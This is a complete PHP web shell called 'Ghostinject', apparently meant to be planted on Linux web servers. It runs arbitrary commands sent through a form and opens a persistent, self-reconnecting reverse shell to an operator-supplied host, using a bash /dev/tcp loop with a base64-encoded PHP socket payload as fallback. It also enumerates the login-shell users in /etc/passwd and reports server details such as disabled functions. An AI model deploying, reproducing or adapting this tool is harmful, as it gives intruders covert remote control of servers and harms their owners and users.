<?php
// Ghostinject - Linux PHP persistent reverse shell + user list
error_reporting(0);

// Command execution
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = @shell_exec($cmd . " 2>&1");
    if ($output === null || $output === '') {
        $paths = ['/bin/sh', '/bin/bash', '/usr/bin/bash'];
        foreach ($paths as $sh) {
            if (is_executable($sh)) {
                $output = @shell_exec($sh . " -c " . escapeshellarg($cmd) . " 2>&1");
                if ($output !== null && $output !== '') break;
            }
        }
    }
    echo "<pre>" . htmlspecialchars($output ?: "[no output]") . "</pre>";
    exit;
}

// Persistent reverse shell (multi-method)
if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
    $host = $_POST['rev_host'];
    $port = (int)$_POST['rev_port'];
    $success = false;

    // Bash /dev/tcp with auto-reconnect
    $bash_paths = ['/bin/bash', '/usr/bin/bash', '/bin/sh'];
    foreach ($bash_paths as $bash) {
        if (is_executable($bash)) {
            $cmd = "$bash -c 'while :; do exec 5<>/dev/tcp/$host/$port; cat <&5 | while read line; do \$line 2>&5 >&5; done; sleep 10; done' 2>/dev/null &";
            @exec($cmd);
            $success = true;
            break;
        }
    }

    // PHP socket fallback
    if (!$success && function_exists('fsockopen')) {
        $payload = base64_encode(
            'set_time_limit(0);$h="' . $host . '";$p=' . $port . ';while(1){' .
            '$s=@fsockopen($h,$p,$e,$e,30);if($s){' .
            'stream_set_timeout($s,120);' .
            'while(!feof($s)){$c=fgets($s);if($c===false)break;$o=shell_exec($c);' .
            'fwrite($s,$o===null?"[error]\\n":$o);}fclose($s);}sleep(10);}'
        );
        @exec("php -r \"eval(base64_decode('$payload'));\" > /dev/null 2>&1 &");
        $success = true;
    }

    echo $success ? "Ghostinject: Persistent reverse shell started (auto-reconnect). Keep listener open!" : "All methods failed.";
    exit;
}

// Helper: get shell users from /etc/passwd
function get_shell_users() {
    $users = '';
    if (@file_exists('/etc/passwd')) {
        $lines = file('/etc/passwd');
        foreach ($lines as $line) {
            $parts = explode(':', $line);
            if (count($parts) >= 7) {
                $shell = trim($parts[6]);
                if (in_array($shell, ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/usr/bin/bash', '/usr/bin/zsh'])) {
                    $users .= htmlspecialchars($parts[0]) . ' (' . $shell . ')<br>';
                }
            }
        }
    }
    return $users ?: 'No shell users found or permission denied.';
}

// System info
$os = php_uname() ?: 'Linux';
$user = function_exists('exec') ? @exec('whoami') : 'N/A';  // fixed: real process user
if (!$user || $user == '') $user = get_current_user();
$cwd = getcwd() ?: 'N/A';
$phpver = phpversion();
$serv = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
$disabled = ini_get('disable_functions') ?: 'none';
$shell_users = get_shell_users();
?>
<!DOCTYPE html>
<html>
<head><title>Ghostinject | Linux PHP (Persistent + Users)</title>
<style>body{background:#0a0f0a;color:#0f0;font-family:monospace;padding:2em;} input,button{background:#222;color:#0f0;border:1px solid #0f0;} button{cursor:pointer;}</style>
</head>
<body>
<h2>👻 Ghostinject - Linux PHP (Persistent Reverse Shell)</h2>
<ul>
<li>Sistema: <?=htmlspecialchars($os)?></li>
<li>Usuário atual (www): <?=htmlspecialchars($user)?></li>
<li>Diretório: <?=htmlspecialchars($cwd)?></li>
<li>PHP: <?=htmlspecialchars($phpver)?></li>
<li>Servidor: <?=htmlspecialchars($serv)?></li>
<li>disable_functions: <?=htmlspecialchars($disabled)?></li>
<li><strong>Usuários com shell (/bin/bash, /bin/sh, etc.) :</strong><br><?=$shell_users?></li>
</ul>
<h3>💻 Command</h3>
<form method="post" id="cmdForm"><input type="text" name="cmd" size="70"><button type="submit">Run</button></form>
<div id="cmdResult"></div>
<h3>🔌 Persistent Reverse Shell</h3>
<form method="post"><input type="text" name="rev_host" placeholder="Your IP" required><br><input type="text" name="rev_port" placeholder="Port" required><br><button type="submit">🚀 Start Ghostinject</button></form>
<script>const f=document.getElementById('cmdForm');f.addEventListener('submit',async e=>{e.preventDefault();let d=new FormData(f);let r=await fetch('',{method:'POST',body:d});document.getElementById('cmdResult').innerHTML=await r.text();});</script>
</body>
</html>
